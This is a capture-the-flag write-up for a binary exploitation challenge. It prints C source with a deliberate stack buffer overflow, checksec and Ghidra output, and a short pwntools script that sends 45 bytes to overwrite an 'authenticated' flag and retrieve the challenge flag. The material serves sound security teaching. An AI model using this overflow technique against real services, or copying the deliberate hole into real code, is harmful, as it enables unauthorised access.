# Flag Server
Category: Binary Exploitation, 50 points

## Description

> I found this cool service that gives out flags, but you need to have a username and password to log in...

```c
#include <stdio.h>
#include <unistd.h>
#include "flag.h"

int get_credentials();
int authenticate_with_server(int *authenticated);
void print_flag();

extern char flag[100];

#define USERNAME_LENGTH 32
#define PASSWORD_LENGTH 64


int main() {
    int authenticated = 0;
    char username[USERNAME_LENGTH] = {0};
    char password[PASSWORD_LENGTH] = {0};

    printf("Hello and thank you for using Flag Distibuter v1.0 🚩🚩🚩\n");

    printf("To receive the flag, please enter your username and password\n");
    printf("Username: ");
    fflush(stdout);
	read(STDIN_FILENO, username, PASSWORD_LENGTH);
    printf("Password: ");
    fflush(stdout);
    read(STDIN_FILENO, password, PASSWORD_LENGTH);
    printf("Autenticating...\n");

    authenticate_with_server(&authenticated);

    if(authenticated)
        print_flag();
    else
        printf("Could not authenticate using these username and password\n");
        
    return 0;
}


void print_flag() {
	printf("Authenticated, here's the flag: %s\n", flag);
}

int authenticate_with_server(int *authenticated) {
    /*TODO: add authentication with server*/
    sleep(1);
    return 0;
}
```

## Solution

We can see that the username buffer is allocated as `username[USERNAME_LENGTH]` but is read into using `read(STDIN_FILENO, username, PASSWORD_LENGTH)`, and since `USERNAME_LENGTH < PASSWORD_LENGTH` we have a buffer overflow. We might be tempted to use it in order to try and call `print_flag`, but the binary is compiled with ASLR:

```console
┌──(user@kali)-[/media/sf_CTFs/ducky_debug_duck/Flag_Server]
└─$ checksec --file ./flag_server
[*] '/media/sf_CTFs/ducky_debug_duck/Flag_Server/flag_server'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Add to that the fact that `read` will read the complete `PASSWORD_LENGTH` it is requested to, and it looks like we won't be able to override just the lower bytes of the return address for a statistic ASLR bypass. Instead, we'll override `authenticated`.

The difference between `authenticated` and `username` according to Ghidra is `abs( (-0x38) - (-0xc) ) = 44`:

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined8 __stdcall main(void)
             undefined8        RAX:8          <RETURN>
             undefined4        Stack[-0xc]:4  authenticated                           XREF[3]:     001011d5(W), 
                                                                                                   001012cc(*), 
                                                                                                   001012d8(R)  
             undefined8        Stack[-0x20]:8 local_20                                XREF[1]:     001011f4(W)  
             undefined8        Stack[-0x28]:8 local_28                                XREF[1]:     001011ec(W)  
             undefined8        Stack[-0x30]:8 local_30                                XREF[1]:     001011e4(W)  
             undefined8        Stack[-0x38]:8 username                                XREF[2]:     001011dc(W), 
                                                                                                   00101274(*)  
             undefined8        Stack[-0x40]:8 local_40                                XREF[1]:     00101234(W)  
             undefined8        Stack[-0x48]:8 local_48                                XREF[1]:     0010122c(W)  
             undefined8        Stack[-0x50]:8 local_50                                XREF[1]:     00101224(W)  
             undefined8        Stack[-0x58]:8 local_58                                XREF[1]:     0010121c(W)  
             undefined8        Stack[-0x60]:8 local_60                                XREF[1]:     00101214(W)  
             undefined8        Stack[-0x68]:8 local_68                                XREF[1]:     0010120c(W)  
             undefined8        Stack[-0x70]:8 local_70                                XREF[1]:     00101204(W)  
             undefined8        Stack[-0x78]:8 password                                XREF[2]:     001011fc(W), 
                                                                                                   001012aa(*)  

```

Therefore, by sending `45` bytes, we'll override `authenticated` to a `true` value and get the flag:

```python
# First, generate a pwntools template using:
#  $ pwn template --host ctf.cs.technion.ac.il --port 4068 ./flag_server
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

def send_payload(p, payload):
    p.recvuntil(b"Username: ")
    p.send(payload)
    p.recvuntil(b"Password: ")
    p.sendline(b"dummy")

io = start()
send_payload(io, b'A' * 45)
print(io.recvall())
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/ducky_debug_duck/Flag_Server]
└─$ python3 exploit.py
[*] '/media/sf_CTFs/ducky_debug_duck/Flag_Server/flag_server'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to ctf.cs.technion.ac.il on port 4068: Done
[+] Receiving all data: Done (79B)
[*] Closed connection to ctf.cs.technion.ac.il port 4068
b"Autenticating...\nAuthenticated, here's the flag: flag{protect_your_boundaries}\n"
```

